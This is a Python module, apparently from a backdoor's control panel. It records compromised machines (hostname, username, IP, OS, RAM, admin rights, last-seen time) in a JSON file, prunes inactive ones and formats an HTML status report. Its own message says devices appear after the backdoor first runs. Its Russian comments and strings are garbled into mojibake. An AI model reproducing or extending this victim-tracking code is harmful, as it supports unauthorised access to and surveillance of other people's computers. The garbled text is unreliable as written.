import os
import json
import logging
from datetime import datetime
from typing import Dict, List, Any

from config import DEVICES_LIST_FILE, DEVICE_STATUS_TIMEOUT
from utils import get_or_create_instance_id, get_or_create_instance_name

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å–æ —Å–ø–∏—Å–∫–æ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤
def get_devices_list() -> List[Dict[str, Any]]:
    """–ü–æ–ª—É—á–∞–µ—Ç —Å–ø–∏—Å–æ–∫ –≤—Å–µ—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤ –∏–∑ —Ñ–∞–π–ª–∞.
    
    Returns:
        List[Dict[str, Any]]: –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤
    """
    try:
        if os.path.exists(DEVICES_LIST_FILE):
            with open(DEVICES_LIST_FILE, 'r', encoding='utf-8') as f:
                devices = json.load(f)
                return devices
        return []
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —á—Ç–µ–Ω–∏–∏ —Å–ø–∏—Å–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤: {e}")
        return []

def save_devices_list(devices: List[Dict[str, Any]]) -> bool:
    """–°–æ—Ö—Ä–∞–Ω—è–µ—Ç —Å–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤ –≤ —Ñ–∞–π–ª.
    
    Args:
        devices (List[Dict[str, Any]]): –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤ –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è
        
    Returns:
        bool: True –µ—Å–ª–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ, –∏–Ω–∞—á–µ False
    """
    try:
        with open(DEVICES_LIST_FILE, 'w', encoding='utf-8') as f:
            json.dump(devices, f, ensure_ascii=False, indent=2)
        return True
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–∏ —Å–ø–∏—Å–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤: {e}")
        return False

def add_device_to_list(instance_id: str, instance_name: str, system_info: Dict[str, Any]) -> bool:
    """–î–æ–±–∞–≤–ª—è–µ—Ç –∏–ª–∏ –æ–±–Ω–æ–≤–ª—è–µ—Ç —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –≤ —Å–ø–∏—Å–∫–µ.
    
    Args:
        instance_id (str): ID —ç–∫–∑–µ–º–ø–ª—è—Ä–∞
        instance_name (str): –ò–º—è —ç–∫–∑–µ–º–ø–ª—è—Ä–∞
        system_info (Dict[str, Any]): –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ
        
    Returns:
        bool: True –µ—Å–ª–∏ –æ–ø–µ—Ä–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–∞, –∏–Ω–∞—á–µ False
    """
    try:
        devices = get_devices_list()
        
        # –ò—â–µ–º —Å—É—â–µ—Å—Ç–≤—É—é—â–µ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ
        device_index = None
        for i, device in enumerate(devices):
            if device.get("instance_id") == instance_id:
                device_index = i
                break
        
        # –°–æ–∑–¥–∞–µ–º –∏–ª–∏ –æ–±–Ω–æ–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
        device_info = {
            "instance_id": instance_id,
            "instance_name": instance_name,
            "hostname": system_info.get("hostname", "Unknown"),
            "username": system_info.get("username", "Unknown"),
            "ip": system_info.get("ip", "Unknown"),
            "os": system_info.get("os", "Unknown"),
            "os_version": system_info.get("os_version", "Unknown"),
            "ram": system_info.get("ram", "Unknown"),
            "admin": system_info.get("admin", False),
            "last_seen": datetime.now().isoformat(),
            "status": "online"
        }
        
        if device_index is not None:
            # –û–±–Ω–æ–≤–ª—è–µ–º —Å—É—â–µ—Å—Ç–≤—É—é—â–µ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ
            devices[device_index] = device_info
            logging.info(f"–û–±–Ω–æ–≤–ª–µ–Ω–æ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: {instance_name}")
        else:
            # –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ
            devices.append(device_info)
            logging.info(f"–î–æ–±–∞–≤–ª–µ–Ω–æ –Ω–æ–≤–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: {instance_name}")
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ–±–Ω–æ–≤–ª–µ–Ω–Ω—ã–π —Å–ø–∏—Å–æ–∫
        return save_devices_list(devices)
        
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ–±–∞–≤–ª–µ–Ω–∏–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –≤ —Å–ø–∏—Å–æ–∫: {e}")
        return False

def update_device_status(instance_id: str, status: str = "online") -> bool:
    """–û–±–Ω–æ–≤–ª—è–µ—Ç —Å—Ç–∞—Ç—É—Å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞.
    
    Args:
        instance_id (str): ID —ç–∫–∑–µ–º–ø–ª—è—Ä–∞
        status (str): –ù–æ–≤—ã–π —Å—Ç–∞—Ç—É—Å
        
    Returns:
        bool: True –µ—Å–ª–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ, –∏–Ω–∞—á–µ False
    """
    try:
        devices = get_devices_list()
        
        for device in devices:
            if device.get("instance_id") == instance_id:
                device["status"] = status
                device["last_seen"] = datetime.now().isoformat()
                break
        
        return save_devices_list(devices)
        
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏ —Å—Ç–∞—Ç—É—Å–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: {e}")
        return False

def cleanup_offline_devices() -> int:
    """–û—á–∏—â–∞–µ—Ç —Å–ø–∏—Å–æ–∫ –æ—Ç —É—Å—Ç—Ä–æ–π—Å—Ç–≤, –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ –±—ã–ª–∏ –∞–∫—Ç–∏–≤–Ω—ã –±–æ–ª–µ–µ 30 –º–∏–Ω—É—Ç.
    
    Returns:
        int: –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —É–¥–∞–ª–µ–Ω–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤
    """
    try:
        devices = get_devices_list()
        current_time = datetime.now()
        removed_count = 0
        
        # –§–∏–ª—å—Ç—Ä—É–µ–º –∞–∫—Ç–∏–≤–Ω—ã–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
        active_devices = []
        for device in devices:
            try:
                last_seen = datetime.fromisoformat(device.get("last_seen", ""))
                time_diff = (current_time - last_seen).total_seconds()
                
                if time_diff < DEVICE_STATUS_TIMEOUT:
                    # –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –∞–∫—Ç–∏–≤–Ω–æ
                    if device.get("status") == "online":
                        active_devices.append(device)
                    else:
                        # –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç—É—Å –Ω–∞ online
                        device["status"] = "online"
                        active_devices.append(device)
                else:
                    # –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –Ω–µ–∞–∫—Ç–∏–≤–Ω–æ
                    removed_count += 1
                    logging.info(f"–£–¥–∞–ª–µ–Ω–æ –Ω–µ–∞–∫—Ç–∏–≤–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: {device.get('instance_name')}")
            except Exception:
                # –ï—Å–ª–∏ –Ω–µ —É–¥–∞–ª–æ—Å—å —Ä–∞–∑–æ–±—Ä–∞—Ç—å –≤—Ä–µ–º—è, –æ—Å—Ç–∞–≤–ª—è–µ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ
                active_devices.append(device)
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ—á–∏—â–µ–Ω–Ω—ã–π —Å–ø–∏—Å–æ–∫
        if save_devices_list(active_devices):
            return removed_count
        return 0
        
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—á–∏—Å—Ç–∫–µ –Ω–µ–∞–∫—Ç–∏–≤–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤: {e}")
        return 0

def format_devices_list(devices: List[Dict[str, Any]]) -> str:
    """–§–æ—Ä–º–∞—Ç–∏—Ä—É–µ—Ç —Å–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤ –≤ –∫—Ä–∞—Å–∏–≤–æ–º HTML –≤–∏–¥–µ.
    
    Args:
        devices (List[Dict[str, Any]]): –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤
        
    Returns:
        str: –û—Ç—Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–Ω–∞—è HTML —Å—Ç—Ä–æ–∫–∞
    """
    try:
        if not devices:
            return "üì± <b>–°–ü–ò–°–û–ö –£–°–¢–†–û–ô–°–¢–í</b>\n\n‚ùå <b>–£—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã</b>\n\nüí° <b>–ü–æ–¥—Å–∫–∞–∑–∫–∞:</b> –£—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –ø–æ—è–≤—è—Ç—Å—è –ø–æ—Å–ª–µ –ø–µ—Ä–≤–æ–≥–æ –∑–∞–ø—É—Å–∫–∞ –±—ç–∫–¥–æ—Ä–∞"
        
        # –°–æ—Ä—Ç–∏—Ä—É–µ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –ø–æ –≤—Ä–µ–º–µ–Ω–∏ –ø–æ—Å–ª–µ–¥–Ω–µ–π –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏
        sorted_devices = sorted(devices, key=lambda x: x.get("last_seen", ""), reverse=True)
        
        html = f"üì± <b>–°–ü–ò–°–û–ö –£–°–¢–†–û–ô–°–¢–í</b> <code>({len(devices)} —à—Ç.)</code>\n\n"
        
        for i, device in enumerate(sorted_devices):
            # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Å—Ç–∞—Ç—É—Å –∏ —ç–º–æ–¥–∑–∏
            status = device.get("status", "unknown")
            if status == "online":
                status_emoji = "üü¢"
                status_text = "–û–Ω–ª–∞–π–Ω"
            else:
                status_emoji = "üî¥"
                status_text = "–û—Ñ—Ñ–ª–∞–π–Ω"
            
            # –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º –≤—Ä–µ–º—è –ø–æ—Å–ª–µ–¥–Ω–µ–π –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏
            try:
                last_seen = datetime.fromisoformat(device.get("last_seen", ""))
                time_ago = datetime.now() - last_seen
                if time_ago.total_seconds() < 60:
                    time_text = "—Ç–æ–ª—å–∫–æ —á—Ç–æ"
                elif time_ago.total_seconds() < 3600:
                    minutes = int(time_ago.total_seconds() // 60)
                    time_text = f"{minutes} –º–∏–Ω. –Ω–∞–∑–∞–¥"
                else:
                    hours = int(time_ago.total_seconds() // 3600)
                    time_text = f"{hours} —á. –Ω–∞–∑–∞–¥"
            except:
                time_text = "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
            
            # –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º –ø—Ä–∞–≤–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
            admin_text = "‚úÖ –ê–¥–º–∏–Ω" if device.get("admin", False) else "‚ùå –û–±—ã—á–Ω—ã–π"
            
            # –ü–æ–ª—É—á–∞–µ–º –∑–Ω–∞—á–µ–Ω–∏—è –¥–ª—è —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
            instance_name = device.get('instance_name', 'Unknown')
            instance_id = device.get('instance_id', 'N/A')
            hostname = device.get('hostname', 'N/A')
            username = device.get('username', 'N/A')
            ip = device.get('ip', 'N/A')
            os_name = device.get('os', 'N/A')
            os_version = device.get('os_version', '')
            ram = device.get('ram', 'N/A')
            
            html += f"{status_emoji} <b>{instance_name}</b>\n"
            html += f"‚îú‚îÄ <b>ID:</b> <code>{instance_id}</code>\n"
            html += f"‚îú‚îÄ <b>–ö–æ–º–ø—å—é—Ç–µ—Ä:</b> <code>{hostname}</code>\n"
            html += f"‚îú‚îÄ <b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å:</b> <code>{username}</code>\n"
            html += f"‚îú‚îÄ <b>IP:</b> <code>{ip}</code>\n"
            html += f"‚îú‚îÄ <b>–û–°:</b> {os_name} {os_version}\n"
            html += f"‚îú‚îÄ <b>RAM:</b> {ram}\n"
            html += f"‚îú‚îÄ <b>–ü—Ä–∞–≤–∞:</b> {admin_text}\n"
            html += f"‚îú‚îÄ <b>–°—Ç–∞—Ç—É—Å:</b> {status_emoji} {status_text}\n"
            html += f"‚îî‚îÄ <b>–ê–∫—Ç–∏–≤–Ω–æ—Å—Ç—å:</b> {time_text}\n"
            
            if i < len(sorted_devices) - 1:
                html += "\n"
        
        # –î–æ–±–∞–≤–ª—è–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
        online_count = sum(1 for d in devices if d.get("status") == "online")
        offline_count = len(devices) - online_count
        
        html += f"\nüìä <b>–°–¢–ê–¢–ò–°–¢–ò–ö–ê:</b>\n"
        html += f"üü¢ <b>–û–Ω–ª–∞–π–Ω:</b> {online_count}\n"
        html += f"üî¥ <b>–û—Ñ—Ñ–ª–∞–π–Ω:</b> {offline_count}\n"
        html += f"‚è∞ <b>–¢–∞–π–º–∞—É—Ç:</b> {DEVICE_STATUS_TIMEOUT // 60} –º–∏–Ω."
        
        return html
        
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏ —Å–ø–∏—Å–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤: {e}")
        return f"‚ùå <b>–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏ —Å–ø–∏—Å–∫–∞:</b>\n<code>{str(e)}</code>"

